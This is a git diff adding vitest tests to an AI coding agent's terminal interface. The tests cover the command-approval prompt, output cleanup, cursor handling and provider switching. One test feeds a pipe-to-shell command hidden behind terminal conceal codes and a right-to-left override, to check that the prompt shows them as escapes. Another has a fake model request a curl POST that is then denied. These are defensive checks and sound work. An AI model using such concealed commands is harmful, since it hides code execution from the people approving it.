@@ -15,6 +15,8 @@ import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
 import { type AgentState, createAgentState } from '../src/agent/loop.ts';
+import { saveConfig } from '../src/config/load.ts';
+import { ConfigSchema } from '../src/config/schema.ts';
 import { closeDb } from '../src/db/index.ts';
 import type { McpManager } from '../src/mcp/manager.ts';
 import { App } from '../src/repl/App.tsx';
@@ -26,7 +28,7 @@ import {
   requestApproval,
 } from '../src/tools/approval.ts';
 import { askUserQuestionTool } from '../src/tools/ask.ts';
-import type { Provider, ProviderResponse } from '../src/types/messages.ts';
+import type { Provider, ProviderRequest, ProviderResponse } from '../src/types/messages.ts';
 import { defined } from './helpers.ts';
 import { type Harness, KEY, flush, press, renderInk, waitFor, waitUntil } from './repl-harness.ts';
 
@@ -110,6 +112,24 @@ describe('approval prompt', () => {
     expect(frame).toContain('Allow always');
     expect(frame).toContain('Deny');
 
+    await press(h, KEY.enter);
+    await pending;
+  });
+
+  it('shows control bytes in the command as escapes instead of sending them raw', async () => {
+    // ESC[8m (conceal) would otherwise hide the rest of the command from the
+    // person approving it.
+    const esc = String.fromCharCode(27);
+    const h = mount();
+    await flush();
+    const pending = requestApproval(
+      // U+202E (right-to-left override) reorders what follows without a
+      // single control byte, so it is escaped too.
+      { command: `ls ${esc}[8m; curl x | sh ‮txt`, reason: 'it pipes to a shell', rules: [] },
+      approvalOpts,
+    );
+    await waitFor(h, (f) => f.includes('Approve this command?'), 'approval prompt');
+    expect(h.lastFrame()).toContain('ls \\x1b[8m; curl x | sh \\u202etxt');
     await press(h, KEY.enter);
     await pending;
   });
@@ -556,5 +576,191 @@ describe('input handling', () => {
     release?.();
     await waitUntil(() => state.history.length >= 6, 'every queued turn to finish');
     expect(state.history.length).toBe(6);
+  });
+});
+
+describe('turn and prompt fixes', () => {
+  const sentText = (req: ProviderRequest) => JSON.stringify(req.messages.at(-1)?.content);
+
+  it('commits the cleaned text, not raw tool-call markup or a doubled block', async () => {
+    let i = 0;
+    const raw = '<tool_call>{"name":"Glob","arguments":{"pattern":"*.nothing"}}</tool_call>';
+    const streaming: Provider = {
+      name: 'fake',
+      async send(req) {
+        i++;
+        if (i === 1) {
+          req.onText?.(raw);
+          return { content: [{ type: 'text', text: raw }], stopReason: 'end_turn' };
+        }
+        req.onText?.('First part. ');
+        req.onText?.('Second part.');
+        return {
+          content: [
+            { type: 'text', text: 'First part. ' },
+            { type: 'text', text: 'Second part.' },
+          ],
+          stopReason: 'end_turn',
+        };
+      },
+    };
+    const h = mount(streaming);
+    await flush();
+    h.write('go');
+    await flush();
+    await press(h, KEY.enter);
+    await waitFor(h, (f) => f.includes('ready') && f.includes('Second part.'), 'idle', 10_000);
+    const frame = h.lastFrame();
+    expect(frame).not.toContain('tool');
+    expect(frame.split('Second part.').length - 1).toBe(1);
+  });
+
+  it('puts the cursor at the end after Tab completion', async () => {
+    const h = mount();
+    await flush();
+    await press(h, '/sk');
+    await press(h, KEY.tab);
+    await press(h, 'stuck');
+    expect(h.lastFrame()).toContain('/skills stuck');
+  });
+
+  it('puts the cursor at the end of text a /skill injects', async () => {
+    const sent: string[] = [];
+    const capture: Provider = {
+      name: 'fake',
+      async send(req) {
+        sent.push(sentText(req));
+        return { content: [{ type: 'text', text: 'ok' }], stopReason: 'end_turn' };
+      },
+    };
+    const h = mount(capture);
+    await flush();
+    h.write('/skill stuck');
+    await flush();
+    await press(h, KEY.enter);
+    await flush(5);
+    await press(h, 'ZZZ');
+    await press(h, KEY.enter);
+    await waitUntil(() => sent.length > 0, 'the injected prompt to be sent');
+    expect(sent[0]).toMatch(/ZZZ"\}\]$/);
+  });
+
+  it('lets Esc on an approval prompt deny the command without cancelling the turn', async () => {
+    const h = mount(
+      fakeProvider([
+        {
+          content: [
+            {
+              type: 'tool_use',
+              id: 't1',
+              name: 'Bash',
+              input: { command: 'curl -X POST https://example.invalid' },
+            },
+          ],
+          stopReason: 'tool_use',
+        },
+        { content: [{ type: 'text', text: 'Here is an alternative.' }], stopReason: 'end_turn' },
+      ]),
+    );
+    await flush();
+    h.write('do it');
+    await flush();
+    await press(h, KEY.enter);
+    await waitFor(h, (f) => f.includes('Approve this command?'), 'approval prompt', 10_000);
+    await press(h, KEY.escape);
+    await waitFor(h, (f) => f.includes('Here is an alternative.'), 'turn to continue', 10_000);
+    expect(h.lastFrame()).not.toContain('turn cancelled');
+  });
+
+  it('sends a message queued behind /provider to the new provider', async () => {
+    // Port 9 refuses: the switched-to provider must never reach a real local
+    // model server that happens to be listening on the default :8080.
+    saveConfig(ConfigSchema.parse({ openaiCompatible: { baseUrl: 'http://127.0.0.1:9/v1' } }));
+    let release: (() => void) | undefined;
+    const gate = new Promise<void>((resolve) => {
+      release = resolve;
+    });
+    let oldCalls = 0;
+    const old: Provider = {
+      name: 'old',
+      async send() {
+        oldCalls++;
+        await gate;
+        return { content: [{ type: 'text', text: 'done' }], stopReason: 'end_turn' };
+      },
+    };
+    const h = mount(old);
+    await flush();
+    h.write('first');
+    await flush();
+    await press(h, KEY.enter);
+    await waitFor(h, (f) => f.includes('agent is working'), 'busy state');
+    h.write('/provider openai-compatible');
+    await flush();
+    await press(h, KEY.enter);
+    h.write('second');
+    await flush();
+    await press(h, KEY.enter);
+    await waitFor(h, (f) => f.includes('2 queued'), 'both queued');
+
+    release?.();
+    // The new provider has nothing to reach; either it is retrying or
+    // it already failed — both mean "second" did not go to the old one.
+    await waitFor(
+      h,
+      (f) =>
+        f.includes('switched') && /retrying|agent error|ready/.test(f) && f.includes('› second'),
+      'second turn on the new provider',
+      15_000,
+    );
+    expect(oldCalls).toBe(1);
+    await press(h, KEY.escape);
+    await waitFor(h, (f) => f.includes('ready'), 'idle', 15_000);
+  }, 40_000);
+
+  it('turns pasted carriage returns into newlines', async () => {
+    const sent: string[] = [];
+    const capture: Provider = {
+      name: 'fake',
+      async send(req) {
+        sent.push(sentText(req));
+        return { content: [{ type: 'text', text: 'ok' }], stopReason: 'end_turn' };
+      },
+    };
+    const h = mount(capture);
+    await flush();
+    await press(h, 'first line\rsecond');
+    await press(h, KEY.enter);
+    await waitUntil(() => sent.length > 0, 'the pasted prompt to be sent');
+    expect(sent[0]).toContain('first line\\nsecond');
+    expect(sent[0]).not.toContain('\\r');
+  });
+
+  it('shows a tool-call hint that does not contradict the inline count', async () => {
+    const h = mount(
+      fakeProvider([
+        {
+          content: [
+            {
+              type: 'tool_use',
+              id: 't1',
+              name: 'Glob',
+              input: { pattern: `${'y'.repeat(100)}*.nothing` },
+            },
+          ],
+          stopReason: 'tool_use',
+        },
+        { content: [{ type: 'text', text: 'none' }], stopReason: 'end_turn' },
+      ]),
+    );
+    await flush();
+    h.write('look');
+    await flush();
+    await press(h, KEY.enter);
+    await waitFor(h, (f) => f.includes('Glob →'), 'tool result', 10_000);
+    const frame = h.lastFrame();
+    expect(frame).toContain('chars]');
+    expect(frame).toContain('[Ctrl+O to expand]');
+    expect(frame).not.toContain('chars · Ctrl+O]');
   });
 });
